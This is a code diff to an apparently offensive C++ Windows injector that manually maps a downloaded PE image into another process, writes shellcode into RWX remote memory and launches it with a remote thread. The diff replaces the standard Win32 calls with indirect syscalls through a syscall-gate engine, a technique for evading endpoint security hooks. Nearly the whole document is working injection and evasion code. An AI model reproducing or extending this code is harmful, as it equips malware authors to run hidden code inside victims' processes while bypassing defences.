@@ -9,9 +9,9 @@
     /MT              # (optional) link the static CRT if need to use a few CRT routines, try avoid CRT entirely 
 */
 
-// #define DEBUG 0
+#define DEBUG 0
 
-// #include "YetAnotherGate.h"
+#include "YetAnotherGate.h"
 #include "injection.h"
 #include "DbgMacros.h"
 #include <winternl.h>
@@ -44,28 +44,28 @@ struct _RESOURCES
 static void* injection_FindExportAddress(HMODULE, const char*);
 
 extern "C" __declspec(noinline) void __stdcall shellcode(LPVOID);
-extern "C" int AddTwoNumbers(int a, int b);
-extern "C" void Suicide(BYTE* pBase, void* my_NtFreeVirtualMemory, void* my_RtlExitUserThread, void* my_VirtualProtect);
+// extern "C" int AddTwoNumbers(int a, int b);
+// extern "C" void Suicide(BYTE* pBase, void* my_NtFreeVirtualMemory, void* my_RtlExitUserThread, void* my_VirtualProtect);
 ///////////////////////////////////////////////////////////////////////////////
 
-// bool setup_syscall_engine()
-// {
+bool setup_syscall_engine()
+{
 
-//     Sys_stb syscallEntries[MAX_SYSCALLS];
-//     size_t numSyscalls = 0;
+	size_t numSyscalls = 0;
+    Sys_stb syscallEntries[MAX_SYSCALLS];
 
-//     syscallEntries[numSyscalls++] = {"ZwAllocateVirtualMemory", 0, 0, nullptr, nullptr};
-//     syscallEntries[numSyscalls++] = {"NtWriteVirtualMemory", 0, 0, nullptr, nullptr};
-//     syscallEntries[numSyscalls++] = {"NtCreateThreadEx", 0, 0, nullptr, nullptr};
+    syscallEntries[numSyscalls++] = {"ZwAllocateVirtualMemory", 0, 0, nullptr, nullptr};
+    syscallEntries[numSyscalls++] = {"NtWriteVirtualMemory", 0, 0, nullptr, nullptr};
+    syscallEntries[numSyscalls++] = {"NtCreateThreadEx", 0, 0, nullptr, nullptr};
 
-//     if(!InitSyscallGate(syscallEntries, numSyscalls))
-//     {
-//         fuk("Syscall Engine error");
-//         return false;
-//     }
+    if(!InitSyscallGate(syscallEntries, numSyscalls))
+    {
+        fuk("Syscall Engine error");
+        return false;
+    }
 
-//     return true;
-// }
+    return true;
+}
 
 NTSTATUS SanityCheck()
 {
@@ -197,20 +197,18 @@ NTSTATUS ManualMap(HANDLE hproc, DWORD PID, std::vector <unsigned char> *downloa
     PVOID baseAddress = reinterpret_cast<void*>(pOptionalHeader->ImageBase);
     SIZE_T regionSize = pOptionalHeader->SizeOfImage;
 
-    // NTSTATUS Sysstatus = (NTSTATUS)(uintptr_t)SysFunction("ZwAllocateVirtualMemory", hproc, &baseAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    pTargetBase = reinterpret_cast<BYTE*>(VirtualAllocEx(hproc, reinterpret_cast<void *>(pOptionalHeader->ImageBase), pOptionalHeader->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
-    if(/*Sysstatus != 0x00000000*/ !pTargetBase) 
+    NTSTATUS Sysstatus = (NTSTATUS)(uintptr_t)SysFunction("ZwAllocateVirtualMemory", hproc, &baseAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if(Sysstatus != 0x00000000) 
     {
         warn("Allocation on preferred base failed, allocating randomly\n");
 
         baseAddress = nullptr;
         regionSize = pOptionalHeader->SizeOfImage;
 
-        // Sysstatus = (NTSTATUS)(uintptr_t)SysFunction("ZwAllocateVirtualMemory", hproc, nullptr, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-        pTargetBase = reinterpret_cast<BYTE*>(VirtualAllocEx(hproc, nullptr, pOptionalHeader->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
-        if(/*Sysstatus != 0x00000000*/ !pTargetBase)
+        Sysstatus = (NTSTATUS)(uintptr_t)SysFunction("ZwAllocateVirtualMemory", hproc, &baseAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        if(Sysstatus != 0x00000000)
         {
-            fuk("Couldn't allocate memory. Status: 0x%X", Sysstatus);
+            fuk("Couldn't allocate memory. Status: 0x", Sysstatus);
             delete[] pSourceBase;
             return 0;
         }
@@ -254,17 +252,10 @@ NTSTATUS ManualMap(HANDLE hproc, DWORD PID, std::vector <unsigned char> *downloa
     LONG_PTR lpNumberOfBytesWritten = NULL;
 
 
-    // Sysstatus = (NTSTATUS)(uintptr_t)SysFunction("NtWriteVirtualMemory", hproc, pTargetBase, pSourceBase, sizeOfHeaders, &lpNumberOfBytesWritten);
-    // if(Sysstatus != 0x00000000)
-    // {
-    //     fuk("Failed to copy headers Status: ", Sysstatus);
-    //     delete[] pSourceBase;
-    //     return 0;
-    // }
-
-    if(!WriteProcessMemory(hproc, pTargetBase, pSourceBase, pOptionalHeader->SizeOfHeaders, nullptr))
+    Sysstatus = (NTSTATUS)(uintptr_t)SysFunction("NtWriteVirtualMemory", hproc, pTargetBase, pSourceBase, sizeOfHeaders, &lpNumberOfBytesWritten);
+    if(Sysstatus != 0x00000000)
     {
-        fuk("Failed to copy headers");
+        fuk("Failed to copy headers Status: ", Sysstatus);
         delete[] pSourceBase;
         return 0;
     }
@@ -318,17 +309,10 @@ NTSTATUS ManualMap(HANDLE hproc, DWORD PID, std::vector <unsigned char> *downloa
             auto pSource = pSourceBase + pSection->PointerToRawData;
             auto pTarget = pTargetBase + pSection->VirtualAddress;
 
-            // Sysstatus = (NTSTATUS)(uintptr_t)SysFunction("NtWriteVirtualMemory", hproc, pTarget, pSource, SizeOfRawData_section, &lpNumberOfBytesWritten);
-            // if(Sysstatus != 0x00000000)
-            // {
-            //     fuk("Failed to copy headers Status: ", Sysstatus);
-            //     delete[] pSourceBase;
-            //     return 0;
-            // }
-
-            if(!WriteProcessMemory(hproc, pTarget, pSource, pSection->SizeOfRawData, nullptr))
+            Sysstatus = (NTSTATUS)(uintptr_t)SysFunction("NtWriteVirtualMemory", hproc, pTarget, pSource, SizeOfRawData_section, &lpNumberOfBytesWritten);
+            if(Sysstatus != 0x00000000)
             {
-                fuk("Coudnt copy the sections in target memory");
+                fuk("Failed to copy headers Status: ", Sysstatus);
                 delete[] pSourceBase;
                 return 0;
             }
@@ -422,26 +406,17 @@ NTSTATUS ManualMap(HANDLE hproc, DWORD PID, std::vector <unsigned char> *downloa
         return 0;
     } norm("\nStart location of ", CYAN"", stubSection->Name, RESET" is", CYAN" 0x", (uintptr_t)vpStartAddressOfShellcode, RESET" size[", CYAN"0x", shellcodeBlockSize, RESET"]");
 
-    // PVOID pShellcodeResourceBase = nullptr;
-    // SIZE_T ShellcoderegionSize = shellcodeBlockSize + sizeof(_RESOURCES);
+    PVOID pShellcodeResourceBase = nullptr;
+    SIZE_T ShellcoderegionSize = shellcodeBlockSize + sizeof(_RESOURCES);
 
-    // Sysstatus = (NTSTATUS)(uintptr_t)SysFunction("ZwAllocateVirtualMemory", hproc, &pShellcodeResourceBase, 0, &ShellcoderegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    // if(Sysstatus != 0x00000000)
-    // {
-    //     fuk("Couldn't allocate memory. Status: 0x%X", Sysstatus);
-    //     delete[] pSourceBase;
-    //     return 0;
-    // }
-
-    BYTE* pShellcodeResourceBase = reinterpret_cast<BYTE*>(VirtualAllocEx(hproc, nullptr, shellcodeBlockSize + sizeof(_RESOURCES), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
-    if(!pShellcodeResourceBase)
+    Sysstatus = (NTSTATUS)(uintptr_t)SysFunction("ZwAllocateVirtualMemory", hproc, &pShellcodeResourceBase, 0, &ShellcoderegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if(Sysstatus != 0x00000000)
     {
-        fuk("Coudnt allocate memory ", GetLastError());
+        fuk("Couldn't allocate memory. Status: 0x%X", Sysstatus);
+        fuk("Couldn't allocate memory. Status: 0x%X", Sysstatus);
         delete[] pSourceBase;
         return 0;
     } norm(std::hex, "\n\nAllocated ", CYAN"0x", shellcodeBlockSize, " bytes (", shellcodeBlockSize / 1024.0, " KB)", RESET" remote Memory at -> ", CYAN"0x", (uintptr_t)pShellcodeResourceBase);
-
-
 
     #if DEBUG | DEBUG_FILE | DEBUG_VECTOR
 
@@ -462,40 +437,24 @@ NTSTATUS ManualMap(HANDLE hproc, DWORD PID, std::vector <unsigned char> *downloa
         sResources_for_shellcode.TargetPid = (HANDLE)(ULONG_PTR)PID;
     //--------------------------------------------------fill resources data before this------------------
 
-    // Sysstatus = (NTSTATUS)(uintptr_t)SysFunction("NtWriteVirtualMemory", hproc, pShellcodeResourceBase, &sResources_for_shellcode, sizeof(sResources_for_shellcode), &lpNumberOfBytesWritten);
-    // if(Sysstatus != 0x00000000)
-    // {
-    //     fuk("Failed to copy the shellcode resources Status: ", Sysstatus);
-    //     delete[] pSourceBase;
-    //     return 0;
-    // } norm("\nShellcode_resources Copied to ", std::hex, CYAN"0x", (uintptr_t)(BYTE*)pShellcodeResourceBase, RESET" and ends at ", CYAN"0x", (uintptr_t)((BYTE*)pShellcodeResourceBase + sizeof(sResources_for_shellcode)), RESET" size[", CYAN"0x", sizeof(sResources_for_shellcode), RESET"]");
-
-    if(!WriteProcessMemory(hproc, pShellcodeResourceBase, &sResources_for_shellcode, sizeof(sResources_for_shellcode), nullptr))
+    Sysstatus = (NTSTATUS)(uintptr_t)SysFunction("NtWriteVirtualMemory", hproc, pShellcodeResourceBase, &sResources_for_shellcode, sizeof(sResources_for_shellcode), &lpNumberOfBytesWritten);
+    if(Sysstatus != 0x00000000)
     {
-        fuk("Failed to copy the shellcode ", GetLastError());
+        fuk("Failed to copy the shellcode resources Status: ", Sysstatus);
         delete[] pSourceBase;
         return 0;
-    } norm("\nShellcode resources Copied to ", std::hex, CYAN"0x", (uintptr_t)pShellcodeResourceBase, RESET" and ends at ", CYAN"0x", (uintptr_t)(pShellcodeResourceBase + sizeof(sResources_for_shellcode)), RESET" size[", CYAN"0x", sizeof(sResources_for_shellcode), RESET"]");
-
+    } norm("\nShellcode_resources Copied to ", std::hex, CYAN"0x", (uintptr_t)(BYTE*)pShellcodeResourceBase, RESET" and ends at ", CYAN"0x", (uintptr_t)((BYTE*)pShellcodeResourceBase + sizeof(sResources_for_shellcode)), RESET" size[", CYAN"0x", sizeof(sResources_for_shellcode), RESET"]");
 
     //-----------------
 
-    // Sysstatus = (NTSTATUS)(uintptr_t)SysFunction("NtWriteVirtualMemory", hproc, pShellcodeTargetBase, vpStartAddressOfShellcode, shellcodeBlockSize, &lpNumberOfBytesWritten);
-    // if(Sysstatus != 0x00000000)
-    // {
-    //     fuk("Failed to copy the shellcode Status: ", Sysstatus);
-    //     delete[] pSourceBase;
-    //     return 0;
-    // } norm("\nShellcode Copied to ", std::hex, CYAN"0x", (uintptr_t)pShellcodeTargetBase, RESET" and ends at ", CYAN"0x", (uintptr_t)(pShellcodeTargetBase + shellcodeBlockSize), RESET" size[", CYAN"0x", shellcodeBlockSize, RESET"]");
-    
-    if(!WriteProcessMemory(hproc, pShellcodeTargetBase, vpStartAddressOfShellcode, shellcodeBlockSize, nullptr))
+    Sysstatus = (NTSTATUS)(uintptr_t)SysFunction("NtWriteVirtualMemory", hproc, pShellcodeTargetBase, vpStartAddressOfShellcode, shellcodeBlockSize, &lpNumberOfBytesWritten);
+    if(Sysstatus != 0x00000000)
     {
-        fuk("Failed to copy the shellcode ", GetLastError());
+        fuk("Failed to copy the shellcode Status: ", Sysstatus);
         delete[] pSourceBase;
         return 0;
     } norm("\nShellcode Copied to ", std::hex, CYAN"0x", (uintptr_t)pShellcodeTargetBase, RESET" and ends at ", CYAN"0x", (uintptr_t)(pShellcodeTargetBase + shellcodeBlockSize), RESET" size[", CYAN"0x", shellcodeBlockSize, RESET"]");
-
-
+    
     //-----------------
 
     uintptr_t shellcodeFunctionAddressInMyProcess = (uintptr_t)&shellcode;
@@ -507,20 +466,13 @@ NTSTATUS ManualMap(HANDLE hproc, DWORD PID, std::vector <unsigned char> *downloa
     HANDLE hThread = NULL;
     PVOID pParams = pShellcodeResourceBase;
 
-    // Sysstatus = (NTSTATUS)(uintptr_t)SysFunction("NtCreateThreadEx", &hThread, THREAD_ALL_ACCESS, nullptr, hproc, pActualShellcodeEntryInTarget, pParams, FALSE, 0, 0, 0, nullptr);
-    // if(Sysstatus != 0x00000000)
-    // {
-    //     fuk("Failed to create a thread for shellcode : ", Sysstatus);
-    //     delete[] pSourceBase;
-    //     return 0;
-    // }
-
-    DWORD ShellcodeThreadId = 0;
-    if(!CreateRemoteThread(hproc, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(pActualShellcodeEntryInTarget), pShellcodeResourceBase, 0, &ShellcodeThreadId))
+    Sysstatus = (NTSTATUS)(uintptr_t)SysFunction("NtCreateThreadEx", &hThread, THREAD_ALL_ACCESS, nullptr, hproc, pActualShellcodeEntryInTarget, pParams, FALSE, 0, 0, 0, nullptr);
+    if(Sysstatus != 0x00000000)
     {
-        fuk("Failed to create a thread shellcode ", GetLastError());
+        fuk("Failed to create a thread for shellcode : ", Sysstatus);
+        delete[] pSourceBase;
         return 0;
-    } norm("\nThread id -> ", std::dec, CYAN"", (int)ShellcodeThreadId);
+    }
 
     norm("\n=_=_=_=_=_=_=_=_=_=_=_=_=_Cpy Shellcode_=_=_=_=_=_=_=_=_=_=_=_=_=");
     #pragma endregion
@@ -615,6 +567,8 @@ static void* injection_FindExportAddress(HMODULE hModule, const char* funcName)
 
 
     ///////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+    #pragma region Shellcode_Declerations
 
     typedef int(WINAPI* pfnMessageBoxW)(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType);
     typedef void(WINAPI* pfnOutputDebugStringW)(LPCWSTR lpOutputString);
@@ -1192,6 +1146,8 @@ static void* injection_FindExportAddress(HMODULE hModule, const char* funcName)
         }
 
     }
+
+    #pragma endregion
 
     __declspec(noinline) void __stdcall shellcode(LPVOID lpParameter)
     {
